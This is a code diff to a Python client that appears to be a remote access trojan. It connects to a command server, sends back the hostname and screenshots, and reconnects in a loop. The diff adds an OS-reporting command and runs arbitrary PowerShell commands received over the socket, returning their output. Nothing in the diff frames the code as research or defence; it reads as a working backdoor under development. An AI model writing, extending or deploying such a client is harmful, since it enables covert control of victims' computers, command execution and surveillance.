@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import pyautogui
+import platform
 import time
 
 IP = "127.0.0.1"
@@ -28,7 +29,28 @@ def handle_communication(sock):
                     sock.send(socket.gethostname().encode())
                 elif data == "exit":
                     sock.close()
-                    return
+                    break
+                elif data == "getos":
+                    os_name = platform.system()
+                    sock.send(os_name.encode())
+                elif data.startswith("powershell"):
+                    try:
+                        process = subprocess.Popen(
+                            ['powershell', '-command', data.split(" ", 1)[1]],
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            text=True
+                        )
+                        stdout, stderr = process.communicate()
+
+                        if stdout:
+                            sock.send(stdout.encode())
+                        elif stderr:
+                            sock.send(stderr.encode())
+                        else:
+                            sock.send("PowerShell command executed, no output.".encode())
+                    except Exception as e:
+                        sock.send(f"Failed to execute PowerShell command: {str(e)}".encode())
                 elif data == "screenshot":
                     try:
                         screenshot = pyautogui.screenshot()
@@ -61,6 +83,7 @@ def handle_communication(sock):
         print("\nClosing socket.")
         sock.close()
         exit(0)
+
 
 while True:
     sock = connect_to_server()
